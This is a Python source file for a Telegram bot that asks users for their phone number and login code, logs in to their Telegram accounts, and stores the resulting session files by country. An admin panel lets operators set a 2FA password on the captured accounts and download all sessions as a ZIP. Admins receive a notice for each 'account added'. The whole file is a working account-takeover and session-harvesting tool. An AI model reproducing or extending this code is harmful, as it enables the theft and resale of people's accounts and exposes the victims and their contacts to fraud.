import asyncio
import nest_asyncio

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import os
import zipfile
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardRemove
from config_engine import ConfigEngine
from telegram_engine import TelegramEngine
import keyboards as kb

config = ConfigEngine()
tg_engine = TelegramEngine(config)

bot = Client(
    "bot_controller",
    api_id=config.api_id,
    api_hash=config.api_hash,
    bot_token=config.bot_token
)

user_sessions = {}
admin_state = {}

async def notify_admins_about_error(user, phone_number: str, error_msg: str, stage: str):
    username = f"@{user.username}" if user.username else "No Username"
    error_text = (
        "⚠️ **User Account Addition Failed!**\n\n"
        f"👤 **User:** {user.first_name} {user.last_name or ''}\n"
        f"🆔 **User ID:** `{user.id}`\n"
        f"🔗 **Username:** {username}\n"
        f"📞 **Phone Number:** `{phone_number}`\n"
        f"📌 **Stage:** `{stage}`\n"
        f"❌ **Error Details:** `{error_msg}`"
    )
    for admin_id in config.admin_ids:
        try:
            await bot.send_message(admin_id, error_text)
        except Exception:
            pass

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client, message: Message):
    user_id = message.from_user.id
    # Clear state on start
    admin_state[user_id] = None
    if user_id in user_sessions:
        del user_sessions[user_id]

    await message.reply_text(
        "👋 **Welcome!**\nPlease send your phone number with country code.\nExample: `+8801700000000` or `8801700000000`",
        reply_markup=ReplyKeyboardRemove()
    )

@bot.on_message(filters.command("admin") & filters.private)
async def admin_command_handler(client, message: Message):
    user_id = message.from_user.id
    if user_id in config.admin_ids:
        await message.reply_text("👑 **Admin Control Panel**", reply_markup=kb.get_main_admin_keyboard())
    else:
        await message.reply_text("❌ You are not authorized to use admin commands.")

@bot.on_message(filters.private & filters.text)
async def handle_messages(client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    u = message.from_user

    # --- CANCEL PROCESS ---
    if text in ["❌ Cancel Process", "/cancel"]:
        if user_id in user_sessions:
            del user_sessions[user_id]
        admin_state[user_id] = None
        await message.reply_text("❌ Process cancelled successfully.", reply_markup=ReplyKeyboardRemove())
        return

    # --- ADMIN ROUTING ---
    if user_id in config.admin_ids:
        if text == "❌ Close Panel":
            admin_state[user_id] = None
            await message.reply_text("🔒 Admin panel closed.", reply_markup=ReplyKeyboardRemove())
            return

        elif text == "⬅️ Back to Main Menu":
            admin_state[user_id] = None
            await message.reply_text("🔙 Main Menu", reply_markup=kb.get_main_admin_keyboard())
            return

        elif text == "⚙️ 2FA Management":
            await message.reply_text("⚙️ **2FA Settings Menu**", reply_markup=kb.get_2fa_keyboard(config.use_2fa))
            return

        elif text.startswith("2FA Status:"):
            config.use_2fa = not config.use_2fa
            status_str = "Enabled ✅" if config.use_2fa else "Disabled ❌"
            await message.reply_text(f"2FA Protection is now **{status_str}**", reply_markup=kb.get_2fa_keyboard(config.use_2fa))
            return

        elif text == "🔑 Set 2FA Password":
            admin_state[user_id] = "SET_2FA"
            await message.reply_text(f"Current Password: `{config.custom_2fa_password}`\nSend new password:")
            return

        elif text == "🌐 Allowed Countries":
            await message.reply_text("🌐 **Country Management Menu**", reply_markup=kb.get_country_keyboard())
            return

        elif text == "📋 List Countries":
            await message.reply_text(f"Allowed Countries: `{', '.join(config.allowed_countries)}`")
            return

        elif text == "➕ Add Country":
            admin_state[user_id] = "ADD_COUNTRY"
            await message.reply_text("Send ISO Country Code to Add (e.g., `CL`, `US`, `BD`):")
            return

        elif text == "➖ Remove Country":
            admin_state[user_id] = "REMOVE_COUNTRY"
            await message.reply_text("Send ISO Country Code to Remove (e.g., `CL`, `US`, `BD`):")
            return

        elif text == "📦 Import All Sessions":
            await export_sessions(message, mode="ALL")
            return

        elif text == "🌍 Country Wise Import":
            await show_country_stats(message)
            admin_state[user_id] = "EXPORT_COUNTRY"
            return

        # STATE INPUT PROCESSING FOR ADMIN
        state = admin_state.get(user_id)
        if state == "SET_2FA":
            config.custom_2fa_password = text
            admin_state[user_id] = None
            await message.reply_text(f"✅ 2FA Password updated to: `{text}`", reply_markup=kb.get_2fa_keyboard(config.use_2fa))
            return
        elif state == "ADD_COUNTRY":
            c_code = text.upper()
            if c_code not in config.allowed_countries:
                config.allowed_countries.append(c_code)
            admin_state[user_id] = None
            await message.reply_text(f"✅ Country `{c_code}` Added!", reply_markup=kb.get_country_keyboard())
            return
        elif state == "REMOVE_COUNTRY":
            c_code = text.upper()
            if c_code in config.allowed_countries:
                config.allowed_countries.remove(c_code)
                await message.reply_text(f"✅ Country `{c_code}` Removed!", reply_markup=kb.get_country_keyboard())
            else:
                await message.reply_text(f"❌ Country `{c_code}` is not in the allowed list.", reply_markup=kb.get_country_keyboard())
            admin_state[user_id] = None
            return
        elif state == "EXPORT_COUNTRY":
            c_code = text.upper()
            admin_state[user_id] = None
            await export_sessions(message, mode="COUNTRY", country_code=c_code)
            return

    # --- USER FLOW (Number & OTP Handling) ---
    formatted_phone = config.format_phone_number(text)
    
    if formatted_phone.replace("+", "").isdigit() and len(formatted_phone) >= 8 and user_id not in user_sessions:
        if not config.is_country_allowed(formatted_phone):
            await message.reply_text("❌ এই কান্ট্রির নম্বর এই বটে গ্রহণযোগ্য নয়।")
            return

        await message.reply_text("🔄 Sending OTP...", reply_markup=kb.get_cancel_keyboard())
        try:
            res = await tg_engine.send_otp(formatted_phone)
            user_sessions[user_id] = {
                "phone": res["formatted_phone"],
                "client": res["client"],
                "hash": res["phone_hash"]
            }
            await message.reply_text("📩 OTP Sent! Send code here:", reply_markup=kb.get_cancel_keyboard())
        except Exception as e:
            err_str = str(e)
            await message.reply_text(f"❌ Error: {err_str}", reply_markup=ReplyKeyboardRemove())
            await notify_admins_about_error(u, formatted_phone, err_str, "OTP Sending")
            
    elif text.isdigit() and user_id in user_sessions:
        sess = user_sessions[user_id]
        await message.reply_text("⚡ Verifying...", reply_markup=ReplyKeyboardRemove())
        
        try:
            res = await tg_engine.complete_login(
                client=sess["client"],
                phone_number=sess["phone"],
                phone_hash=sess["hash"],
                otp_code=text
            )
            
            if res["status"] == "success":
                await message.reply_text("✅ Account successfully received!")
                
                # Admin Notification
                username = f"@{u.username}" if u.username else "No Username"
                country = res["country"]
                notify_text = (
                    "🎉 **New Account Added Successfully!**\n\n"
                    f"👤 **Adder Name:** {u.first_name} {u.last_name or ''}\n"
                    f"🆔 **User ID:** `{u.id}`\n"
                    f"🔗 **Username:** {username}\n"
                    f"📞 **Phone Number:** `{res['formatted_phone']}`\n"
                    f"🌍 **Country:** `{country}`\n"
                    f"🔐 **2FA Status:** `{'Enabled' if config.use_2fa else 'Disabled'}`"
                )
                for admin_id in config.admin_ids:
                    try:
                        await bot.send_message(admin_id, notify_text)
                    except Exception:
                        pass
            else:
                err_msg = res.get('message', 'Unknown Error')
                await message.reply_text(f"❌ Login Failed: {err_msg}")
                await notify_admins_about_error(u, sess['phone'], err_msg, "Login Verification")

        except Exception as e:
            err_str = str(e)
            await message.reply_text(f"❌ Login Failed: {err_str}")
            await notify_admins_about_error(u, sess['phone'], err_str, "Login Process Exception")
            
        del user_sessions[user_id]

async def show_country_stats(message: Message):
    base_dir = tg_engine.storage_dir
    if not os.path.exists(base_dir):
        await message.reply_text("📁 No sessions found.")
        return

    text = "📊 **Available Sessions by Country:**\n\n"
    found = False
    for item in os.listdir(base_dir):
        item_path = os.path.join(base_dir, item)
        if os.path.isdir(item_path):
            count = len([f for f in os.listdir(item_path) if f.endswith(".session")])
            text += f"🏁 **Country `{item}`**: `{count}` accounts\n"
            found = True
            
    if not found:
        text = "📂 Database is empty."
    else:
        text += "\n👇 **Type/Send the Country Code (e.g., CL, BD, US) to export:**"
        
    await message.reply_text(text)

async def export_sessions(message: Message, mode="ALL", country_code=None):
    base_dir = tg_engine.storage_dir
    target_dir = base_dir if mode == "ALL" else os.path.join(base_dir, country_code or "")

    if not os.path.exists(target_dir) or not os.listdir(target_dir):
        await message.reply_text("❌ No sessions found to export.", reply_markup=kb.get_main_admin_keyboard())
        return

    msg = await message.reply_text("📦 Creating ZIP...")
    zip_name = f"sessions_{country_code or 'ALL'}.zip"

    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(target_dir):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, base_dir)
                zipf.write(full_path, arcname)

    await message.reply_document(document=zip_name, caption=f"✅ Exported Mode: `{mode}` | Code: `{country_code or 'ALL'}`")
    os.remove(zip_name)
    await msg.delete()

print("🤖 Upgraded Admin Panel Bot Running...")
bot.run()
